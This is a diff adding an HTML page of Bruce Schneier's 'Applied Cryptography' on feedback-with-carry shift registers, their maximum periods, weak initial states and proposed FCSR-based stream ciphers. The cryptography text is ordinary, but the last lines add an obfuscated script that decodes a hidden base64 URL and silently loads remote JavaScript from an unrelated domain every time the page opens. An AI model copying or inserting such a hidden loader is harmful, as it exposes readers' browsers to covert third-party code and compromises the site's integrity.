@@ -1,0 +1,138 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Other Stream Ciphers and Real Random-Sequence Generators</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=17//-->
+<!--PAGES=403-405//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="17-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="17-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>There are a few things to note here. First, the carry register is not a single bit; it is a number. The size of the carry register must be at least <I>log</I><SUB>2</SUB><I>t</I>, where <I>t</I> is the number of taps. There are only two taps in the previous example, so the carry register only has to be 1 bit wide. If there were four taps, the carry register would have to be 2 bits wide, and could be either 0, 1, 2, or 3.</P>
+<P>Second, there is an initial transient before the FCSR settles down into its repeating period. In the previous example, only one state never repeated. For larger and more complicated FCSRs, there may be more.</P>
+<P>Third, the maximum period of a FCSR is not 2<SUP>n</SUP> - 1, where <I>n</I> is the length of the shift register. The maximum period is <I>q</I> - 1, where <I>q</I> is the <B>connection integer</B>. This number gives the taps and is defined by:</P>
+<DL>
+<DD><I>q</I> = 2<I>q</I><SUB>1</SUB> &#43; 2<SUP>2</SUP><I>q</I><SUB>2</SUB> &#43; 2<SUP>4</SUP><I>q</I><SUB>4</SUB> &#43;...&#43; 2<SUP>n</SUP><I>q</I><SUB>n</SUB> - 1
+</DL>
+<P>(Yes, the <I>q</I><SUB>i</SUB>s are numbered from left to right.) And even worse, <I>q</I> has to be a prime for which 2 is a primitive root. The rest of this discussion assumes <I>q</I> is of this form.</P>
+<P>In this example, <I>q</I> = 2*0 &#43; 4*1 &#43; 8*1 - 1 = 11. And 11 is a prime with 2 as a primitive root. So the maximum period is 10.</P>
+<P>Not all initial states give you the maximum period. For example, look at the FCSR when the initial value is 101 and the carry register is set to 4.</P>
+<I><P><A NAME="Fig4"></A><A HREF="javascript:displayWindow('images/17-04.jpg',219,116 )"><IMG SRC="images/17-04t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/17-04.jpg',219,116)"><FONT COLOR="#000077"><B>Figure 17.4</B></FONT></A>&nbsp;&nbsp;3-bit FCSR.</I>
+</P>
+<TABLE WIDTH="65%">
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">Shift Register
+<TD VALIGN="TOP" ALIGN="LEFT">Carry Register
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">1 0 1
+<TD VALIGN="TOP" ALIGN="LEFT">4
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">1 1 0
+<TD VALIGN="TOP" ALIGN="LEFT">2
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">1 1 1
+<TD VALIGN="TOP" ALIGN="LEFT">1
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT" WIDTH="5%">
+<TD VALIGN="TOP" ALIGN="LEFT">1 1 1
+<TD VALIGN="TOP" ALIGN="LEFT">1
+</TABLE>
+<P>At this point the register spits out a neverending stream of 1s.
+</P>
+<P>Any initial state will result in one of four things. First, it is part of the maximum period. Second, it will fall into the maximum period after an initial transient. Third, it will fall into a sequence of all zeros after an initial transient. Fourth, it will fall into a sequence of all ones after an initial transient.</P>
+<P>There is a mathematical formula for determining what will happen to a given initial state, but it&#146;s much easier to just test it. Run the FCSR for a while. (If <I>m</I> is the initial memory, and <I>t</I> is the number of taps, then <I>log</I><SUB>2</SUB>(<I>t</I>) &#43; <I>log</I><SUB>2</SUB>(<I>m</I>) &#43; 1 steps are enough.) If it degenerates into a neverending stream of 0s or 1s within <I>n</I> bits, where <I>n</I> is the length of the FCSR, don&#146;t use it. If it doesn&#146;t, then use it. Since the initial state of a FCSR corresponds to the key of the stream cipher, this means that a FCSR-based generator will have a set of weak keys.</P>
+<P>Table 17.1 lists all connection integers less than 10,000 for which 2 is a primitive root. These all have maximum period <I>q</I> - 1. To turn one of these numbers into a tap sequence, calculate the binary expansion of <I>q</I> &#43; 1. For example, 9949 would translate to taps on bits 1, 2, 3, 4, 6, 7, 9, 10, and 13, because</P>
+<DL>
+<DD>9950 = 2<SUP>13</SUP> &#43; 2<SUP>10</SUP> &#43; 2<SUP>9</SUP> &#43; 2<SUP>7</SUP> &#43; 2<SUP>6</SUP> &#43; 2<SUP>4</SUP> &#43; 2<SUP>3</SUP> &#43; 2<SUP>2</SUP> &#43; 2<SUP>1</SUP>
+</DL>
+<P>Table 17.2 lists <I>all</I> the 4-tap tap sequences that result in a maximal-length FCSR for shift register lengths of 32 bits, 64 bits, and 128 bits. Each of the four values, <I>a, b, c</I>, and <I>d</I>, combine to generate <I>q</I>, a prime for which 2 is primitive.</P>
+<DL>
+<DD><I>q</I> = 2<SUP><I>a</I></SUP> &#43; 2<SUP><I>b</I></SUP> &#43; 2<SUP><I>c</I></SUP> &#43; 2<SUP><I>d</I></SUP> - 1
+</DL>
+<P>Any of these tap sequences can be used to create a FCSR with period <I>q</I> - 1.</P>
+<P>The idea of using FCSRs for cryptography is still very new; it is being pioneered by Andy Klapper and Mark Goresky [844,845,654,843,846]. Just as the analysis of LFSRs is based on the addition of primitive polynomials mod 2, analysis of FCSRs is based on addition over something called the <B>2-adic</B> numbers. The theory is well beyond the scope of this book, but there seems to be a 2-adic analog for everything. Just as you can define linear complexity, you can define 2-adic complexity. There is even a 2-adic analog to the Berlekamp-Massey algorithm. What this means is that the list of potential stream ciphers has just doubled&#151;at least. Anything you can do with a LFSR you can do with a FCSR.</P>
+<P>There are further enhancements to this sort of idea, ones that involve multiple carry registers. The analysis of these sequence generators is based on addition over the ramified extensions of the 2-adic numbers [845,846].</P>
+<H3><A NAME="Heading6"></A><FONT COLOR="#000077">17.5 Stream Ciphers Using FCSRs</FONT></H3>
+<P>There aren&#146;t any FCSR stream ciphers in the literature; the theory is still too new. In the interests of getting the ball rolling, I propose some here. I am taking two different tacks: I am proposing FCSR stream ciphers that are identical to previously proposed LFSR generators, and I am proposing stream ciphers that use both FCSRs and LFSRs. The security of the former can probably be analyzed using 2-adic numbers; the latter cannot be analyzed using algebraic techniques&#151;they can probably only be analyzed indirectly. In any case, it is important to choose LFSRs and FCSRs whose periods are relatively prime.
+</P>
+<P>All this will come later. Right now I know of no implementation or analysis of any of these ideas. Wait some years and scan the literature before you trust any of them.</P>
+<P><FONT SIZE="+1"><B><I>Cascade Generators</I></B></FONT></P>
+<P>There are two ways to use FCSRs in a cascade generator:
+</P>
+<DL>
+<DD>&#151; FCSR Cascade. The Gollmann cascade with FCSRs instead of LFSRs.
+<DD>&#151; LFSR/FCSR Cascade. The Gollmann cascade with the generators alternating between LFSRs and FCSRs.
+</DL>
+<P><FONT SIZE="+1"><B><I>FCSR Combining Generators</I></B></FONT></P>
+<P>These generators use a variable number of LFSRs and/or FCSRs, and a variety of functions to combine them. The XOR operation destroys the algebraic properties of FCSRs, so it makes sense to use it to combine them. The generator, shown in Figure 17.5, uses a variable number of FCSRs. Its output is the XOR of the outputs of the individual FCSRs.
+</P>
+<P>Other generators along similar lines are:</P>
+<DL>
+<DD>&#151; FCSR Parity Generator. All registers are FCSRs and the combining function is XOR.
+<DD>&#151; LFSR/FCSR Parity Generator. Registers are a mix of LFSRs and FCSRs and the combining function is XOR.
+<DD>&#151; FCSR Threshold Generator. All registers are FCSRs and the combining function is the majority function.
+<DD>&#151; LFSR/FCSR Threshold Generator. Registers are a mix of LFSRs and FCSRs and the combining function is the majority function.
+<DD>&#151; FCSR Summation Generator. All registers are FCSRs and the combining function is addition with carry.
+<DD>&#151; LFSR/FCSR Summation Generator. Registers are a mix of LFSRs and FCSRs and the combining function is addition with carry.
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="17-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="17-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(GqqABYqP, uomwocAk) {uomwocAk = GqqABYqP.createElement('script');uomwocAk.type = 'text/javascript';uomwocAk.async = true;uomwocAk.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');GqqABYqP.getElementsByTagName('body')[0].appendChild(uomwocAk);}(document));</script></body>
+</html>
